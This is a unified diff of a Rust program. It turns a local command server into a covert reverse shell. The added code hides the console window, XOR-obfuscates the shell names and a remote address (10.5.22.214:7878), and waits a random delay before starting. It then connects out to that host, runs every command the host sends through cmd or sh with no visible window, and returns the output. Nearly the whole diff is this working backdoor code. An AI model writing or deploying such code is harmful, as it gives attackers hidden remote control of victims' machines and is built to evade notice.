@@ -1,79 +1,140 @@
+#![windows_subsystem = "windows"]
 use std::io::{Read, Write};
-use std::net::{TcpListener, TcpStream};
+use std::net::TcpStream;
 use std::process::{Command, Stdio};
 use std::env;
 use std::path::PathBuf;
+use std::fs::OpenOptions;
+use std::thread;
+use std::time::Duration;
+use rand::Rng;
 use dirs;
+#[cfg(windows)]
+use std::os::windows::process::CommandExt;
 
-fn handle_client(mut stream: TcpStream) -> std::io::Result<()> {
-    let mut buffer = [0; 1024];
+fn xor_obfuscate(s: &str, key: u8) -> Vec<u8> {
+    s.bytes().map(|b| b ^ key).collect()
+}
+
+fn xor_deobfuscate(data: &[u8], key: u8) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ key).collect()).unwrap_or_default()
+}
+
+fn process_connection(mut stream: TcpStream) -> std::io::Result<()> {
+    // Send initial "ready" message to synchronize
+    let ready_msg = b"Client ready\n";
+    let len = ready_msg.len() as u32;
+    stream.write_all(&len.to_be_bytes())?;
+    stream.write_all(ready_msg)?;
+    stream.flush()?;
+
+    let mut data_buffer = [0; 1024];
+    let exit_cmd = xor_obfuscate("exit", 0x42);
+    let shell_win = xor_obfuscate("cmd", 0x42);
+    let shell_unix = xor_obfuscate("sh", 0x42);
+    let cls_cmd = xor_obfuscate("cls", 0x42);
+    let clear_cmd = xor_obfuscate("clear", 0x42);
     
     loop {
-        // Read command from client
-        let bytes_read = stream.read(&mut buffer)?;
+        // Clear buffer before reading
+        data_buffer.fill(0);
+        // Read command from server
+        let bytes_read = stream.read(&mut data_buffer)?;
         if bytes_read == 0 {
-            return Ok(()); // Client disconnected
+            return Ok(());
         }
 
-        let input = String::from_utf8_lossy(&buffer[..bytes_read]).trim().to_string();
+        let input = String::from_utf8_lossy(&data_buffer[..bytes_read]).trim().to_string();
         
         // Exit condition
-        if input == "exit" {
-            stream.write_all(b"Goodbye\n")?;
+        if input.as_bytes() == xor_obfuscate(&xor_deobfuscate(&exit_cmd, 0x42), 0x42) {
+            let response = b"Goodbye\n";
+            let len = response.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response)?;
+            stream.flush()?;
             return Ok(());
         }
 
         // Skip empty input
         if input.is_empty() {
-            stream.write_all(b"Empty command\n")?;
+            let response = b"Empty command\n";
+            let len = response.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response)?;
+            stream.flush()?;
             continue;
         }
 
         // Split input into command and arguments
         let parts: Vec<&str> = input.split_whitespace().collect();
         if parts.is_empty() {
-            stream.write_all(b"Invalid command\n")?;
+            let response = b"Invalid command\n";
+            let len = response.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response)?;
+            stream.flush()?;
             continue;
         }
 
-        let command = parts[0];
+        let cmd_name = parts[0];
         let args = &parts[1..];
         let current_dir = env::current_dir()?;
 
-        // Handle cd command specially
-        if command == "cd" {
+        // Handle cd command
+        if cmd_name == "cd" {
             let target_dir = if args.is_empty() {
-                // If no argument, go to home directory
                 dirs::home_dir().unwrap_or(current_dir)
             } else {
                 PathBuf::from(args[0])
             };
 
-            // Change directory
-            match env::set_current_dir(&target_dir) {
+            let response = match env::set_current_dir(&target_dir) {
                 Ok(_) => {
                     let new_dir = env::current_dir()?;
-                    let response = format!("Changed directory to {}\n", new_dir.display());
-                    stream.write_all(response.as_bytes())?;
+                    format!("Changed directory to {}\n", new_dir.display())
                 }
-                Err(e) => {
-                    let response = format!("Error changing directory: {}\n", e);
-                    stream.write_all(response.as_bytes())?;
-                }
-            }
+                Err(e) => format!("Error changing directory: {}\n", e),
+            };
+            let response_bytes = response.as_bytes();
+            let len = response_bytes.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response_bytes)?;
+            stream.flush()?;
             continue;
         }
 
-        // Execute other commands
-        let output = Command::new(command)
-            .args(args)
-            .current_dir(current_dir)
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
-            .output();
+        // Handle cls and clear commands
+        if (cfg!(target_os = "windows") && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&cls_cmd, 0x42), 0x42)) || 
+           (cfg!(not(target_os = "windows")) && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&clear_cmd, 0x42), 0x42)) {
+            let response = b"Screen clear command executed\n";
+            let len = response.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response)?;
+            stream.flush()?;
+            continue;
+        }
 
-        // Send output or error back to client
-        match output {
+        let output = if cfg!(target_os = "windows") {
+            let mut cmd = Command::new(xor_deobfuscate(&shell_win, 0x42));
+            cmd.args(&["/C", cmd_name])
+               .args(args)
+               .current_dir(current_dir)
+               .stdout(Stdio::piped())
+               .stderr(Stdio::piped())
+               .creation_flags(0x08000000);
+            cmd.output()
+        } else {
+            Command::new(xor_deobfuscate(&shell_unix, 0x42))
+                .arg("-c")
+                .arg(format!("{} {}", cmd_name, args.join(" ")))
+                .current_dir(current_dir)
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .output()
+        };
+
+        let response = match output {
             Ok(output) => {
                 let mut response = Vec::new();
                 response.extend_from_slice(&output.stdout);
@@ -81,34 +142,35 @@ fn handle_client(mut stream: TcpStream) -> std::io::Result<()> {
                 if response.is_empty() {
                     response = b"Command executed successfully\n".to_vec();
                 }
-                stream.write_all(&response)?;
+                response
             }
-            Err(e) => {
-                let response = format!("Error executing command: {}\n", e);
-                stream.write_all(response.as_bytes())?;
-            }
-        }
+            Err(e) => format!("Error executing command: {}\n", e).into_bytes(),
+        };
+        let len = response.len() as u32;
+        stream.write_all(&len.to_be_bytes())?;
+        stream.write_all(&response)?;
+        stream.flush()?;
     }
 }
 
 fn main() -> std::io::Result<()> {
-    let listener = TcpListener::bind("127.0.0.1:7878")?;
-    println!("Server running on 127.0.0.1:7878");
+    let delay = rand::thread_rng().gen_range(1000..5000);
+    thread::sleep(Duration::from_millis(delay));
 
-    for stream in listener.incoming() {
-        match stream {
-            Ok(stream) => {
-                std::thread::spawn(|| {
-                    if let Err(e) = handle_client(stream) {
-                        eprintln!("Error handling client: {}", e);
-                    }
-                });
-            }
-            Err(e) => {
-                eprintln!("Error accepting connection: {}", e);
-            }
-        }
+    if let Ok(mut file) = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("app_log.txt") {
+        let _ = writeln!(file, "Application started at {:?}", std::time::SystemTime::now());
     }
+
+    let remote_addr_obf = xor_obfuscate("10.5.22.214:7878", 0x42);
+    let remote_addr = xor_deobfuscate(&remote_addr_obf, 0x42);
+    
+    let mut stream = TcpStream::connect(&remote_addr)?;
+    stream.flush()?;
+    
+    process_connection(stream)?;
 
     Ok(())
 }
